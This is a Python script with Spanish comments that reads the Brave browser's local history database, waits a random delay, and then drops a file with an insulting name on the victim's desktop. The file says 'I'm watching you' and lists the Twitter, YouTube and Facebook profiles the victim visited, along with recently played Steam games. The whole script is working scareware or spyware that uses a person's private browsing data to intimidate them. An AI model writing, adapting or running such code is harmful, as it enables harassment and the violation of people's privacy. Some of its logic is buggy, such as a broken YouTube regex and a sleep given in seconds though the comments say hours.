import glob
import os
import random
import re
import sqlite3
from pathlib import Path
from time import sleep

NAMEFILE = "QUE ONDA PUTO.txt"

def get_path():
    return "{}\\".format(Path.home())

def dormicion():
    n_hours = random.randrange(1, 4)
    print(n_hours)
    sleep(n_hours)


def crear_archivo(path):
    archivo = open(path + "\\OneDrive\\Escritorio\\" + NAMEFILE, "w")
    archivo.write("Te estoy mirando puto \n")
    return archivo


def history_chrome(Path):
    urls = None
    while not urls:
        try:
            db_path = Path + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
            connection = sqlite3.connect(db_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            print(urls)
            return urls
        except sqlite3.OperationalError:
            print("Imposible de acceder al historial reintentando en 1 hora")
            sleep(5)


def check_twitter(file, urls):
    profile_twitter = []
    for item in urls[:3]:
        resluts = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if resluts and resluts[0] not in ["notifications", "home","login"]:
            profile_twitter.append(resluts[0])
    file.write("Eh visto que has visitado los perfiles de twitter de {}... \n".format(", ".join(profile_twitter)))


def check_youtube(file, urls):
    profile_youtube = []
    for item in urls[:]:
        results = re.findall("https://www.youtube.com/user/([A-Za-z0-9]+)$" and "https://www.youtube.com/c/([A-Za-z0-9]+)$", item[2])
        if results:
            profile_youtube.append(results[0])
    file.write("Eh visto que has visitado los perfiles de youtube de {}... \n".format(", ".join(profile_youtube)))


def check_facebook(file, urls):
    profile_facebook = []
    for item in urls[:]:
        results = re.findall("https://www.facebook.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["stories", "friends", "watch", "marketplace", "gaming"]:
            profile_facebook.append(results[0])
    file.write("Eh visto que has visitado los perfiles de facebook de {}... \n".format(", ".join(profile_facebook)))


def check_steam(file):
    try:
        games = []
        steam_phat = 'C:/Program Files (x86)/Steam/steamapps/common/*'
        games_path = glob.glob(steam_phat)
        games_path.sort(key=os.path.getmtime, reverse=True)
        for games_paths in games_path[:4]:
            games_paths = games_paths.split("\\")[-1]
            if games_paths not in ["wallpaper_engine","Steam Controller Configs","Steamworks Shared"]:
                games.append(games_paths.split("\\")[-1])
        file.write("Tambien estuviste jugando a estos juegos {}".format(", ".join(games)))
    except:
        print("No tiene steam")





def main():
    #Calculamos la direccion
    Path = get_path()
    #Nos guardamos el histrial de google
    urls = history_chrome(Path)
    # Esperamos 1 a 3 horas para iniciar el script
    dormicion()
    # Creamos el archivo en el escritorio
    hackerfile = crear_archivo(Path)
    #cargamos el historial para asustar
    check_twitter(hackerfile, urls)
    check_youtube(hackerfile, urls)
    check_facebook(hackerfile, urls)
    check_steam(hackerfile)


if __name__ == "__main__":
    main()